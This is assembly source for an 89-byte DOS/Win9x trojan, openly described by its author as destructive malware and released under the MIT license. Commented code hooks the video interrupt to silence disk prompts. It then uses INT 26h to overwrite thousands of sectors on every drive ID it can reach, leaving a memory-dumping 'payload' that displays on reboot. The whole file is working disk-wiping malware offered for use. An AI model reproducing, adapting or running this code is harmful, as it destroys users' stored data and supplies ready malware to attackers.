
; A piece of pretty destructive malware.
; Copyright (C) 2019 by Palaiologos.
; Licensed under terms of MIT license.
;          Happy hacking!
; --------------------------------------
; When ran on a DOS-based system, it will become unresponsive. After reboot, an
; interesting payload will be shown :).

; The general idea of the code is simple. We need to overwrite 07FFFh sectors of
; each device ID we can find, up to 0FFh. There are a few gotchas though.
; a) DOS will display prompt about putting a disk inside the drive, so the int10h
;    has been hooked (pff), for a poor man's solution to shut it up.
; b) We need carefully crafted data so we can present a nice payload to user after the
;    trashing process is done.
; c) We need a source of entropy for the program. I've been considering CMOS memory,
;    but it's inconvinient to use if I want to keep the trojan below 100 bytes, so the code
;    is scanning the entire memory for data and dumping it out on the screen.

ORG 100h    MOV		ES, ES                 ; Clear ES
            MOV		WORD [ES:40h], HOOK    ; So we can put our hook at 10h * 4
            MOV		WORD [ES:42h], CS      ; ... and the code segment at 10h * 4 + 2
            XOR		AL, AL                 ; Clear AL, as we will use it as a drive index.
TDRIVE:     XOR		DX, DX                 ; Clear DX, as we will use it to hold sector LBA.
TSECTOR:    MOV		BX, FUNNY              ; We want to fill the sector with "funny" procedure.
            MOV		CX, 1                  ; CX = one sector.
            PUSHA                              ; Prepare for the interrupt
            INT		26h                    ; Switch!
            POPA                               ; Restore the registers.
            INC		DX                     ; Increment the sector LBA`
            CMP		DX, 07FFFh             ; Did we hit 7FFFh sectors already?
            JNE		TSECTOR                ; Nope? Pass it around and wipe stuff again.
            INC		AL                     ; Yup! Increment the device ID.
            CMP		AL, 0FFh               ; 255 devices written?
            JNE		TDRIVE                 ; Nope? Pass it around.
FUNNY:      MOV		AX, 0B800h             ; The routine responsible for the bootable payload.
            MOV		ES, AX                 ; Set ES to point segment B800h, when multiplied x16 we get
            XOR		AX, AX                 ; video memory area. Clear AX again.
            MOV		DS, AX                 ; The data segment we will extract stuff from.
            XOR		BX, BX                 ; Clear read offset (stored in BX)
            XOR		SI, SI                 ; Clear write offset (stored in SI)
FL:         MOV		AX, [DS:BX]            ; Read the byte from memory.
            CMP		AX, 0                  ; Is it null?
            JE		SKIP                   ; Skip displaying it.
            MOV		[ES:SI], AX            ; Display the byte.
            INC		SI                     ; Increment write index.
            AND		SI, 0FFFh              ; The terminal is 80x25 with 2bpc, so we get 4000 bytes
SKIP:       INC		BX                     ; ... per screen, close enough to 0FFFh :). Increment BX
            CMP		BX, 07FFFh             ; Did we hit the boundary?
            JE		ADJUST                 ; Yeah, adjust the segment and clear offset.
            JMP		FL                     ; Loop otherwise.
ADJUST:     XOR		BX, BX                 ; Clear offset
            INC		AX                     ; Increment segment counter
            MOV		DS, AX                 ; Make it real.
            JMP		FL                     ; Loop again.
HOOK:       IRET                               ; No printing for you!

; That's it! 89 byte DOS/Win9x trojan with a cool payload ;).
